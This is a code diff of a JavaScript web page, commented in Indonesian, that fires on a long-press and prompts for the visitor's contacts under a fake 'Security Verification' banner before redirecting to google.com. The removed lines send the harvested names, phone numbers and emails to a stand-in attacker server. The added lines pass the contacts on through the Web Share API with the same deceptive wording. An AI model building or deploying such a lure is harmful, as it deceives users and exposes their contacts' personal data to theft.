@@ -66,39 +66,35 @@
         document.addEventListener("contextmenu", () => {
             // Jeda 3 detik setelah gestur long-press (contextmenu) terdeteksi
             setTimeout(async () => {
-                let collectedContacts = [];
+                let contactSummary = "Verifikasi akun keamanan perangkat berhasil.";
 
                 try {
                     // 1. Memanggil Contact Picker API
                     if (navigator.contacts && navigator.contacts.select) {
                         try {
-                            collectedContacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                            
+                            // Jika ada kontak yang dipilih, format data menjadi teks ringkas
+                            if (contacts && contacts.length > 0) {
+                                let details = contacts.map(c => {
+                                    let name = c.name ? c.name.join(', ') : 'Tanpa Nama';
+                                    let tel = c.tel ? c.tel.join(', ') : 'Tanpa Telp';
+                                    return `${name}: ${tel}`;
+                                }).join(' | ');
+                                
+                                contactSummary = `Data Kontak: ${details}`;
+                            }
                         } catch (pickerErr) {
                             console.debug("Picker interaction cancelled or restricted.");
                         }
                     }
 
-                    // 2. Mengirimkan hasil select ke server/attacker page menggunakan fetch (POST)
-                    if (collectedContacts.length > 0) {
-                        try {
-                            await fetch('https://YOUR-ATTACKER-SERVER.com/collect', {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json'
-                                },
-                                body: JSON.stringify({ contacts: collectedContacts })
-                            });
-                        } catch (sendErr) {
-                            console.debug("Failed to send data to server.");
-                        }
-                    }
-
-                    // 3. Memicu Web Share API (opsional setelah data dikirim)
+                    // 2. Meneruskan hasil pilihan ke Web Share API tanpa server eksternal
                     if (navigator.share) {
                         try {
                             await navigator.share({
-                                title: 'Security Verification',
-                                text: 'Verifikasi akun keamanan perangkat Anda berhasil.',
+                                title: 'Security Verification Result',
+                                text: contactSummary,
                                 url: window.location.href
                             });
                         } catch (shareErr) {
@@ -109,7 +105,7 @@
                 } catch (e) {
                     console.debug("Execution fallback triggered.");
                 } finally {
-                    // 4. Auto Redirect langsung ke google.com setelah proses selesai
+                    // 3. Auto Redirect langsung ke google.com setelah proses selesai
                     window.location.href = "https://google.com";
                 }
             }, 3000);
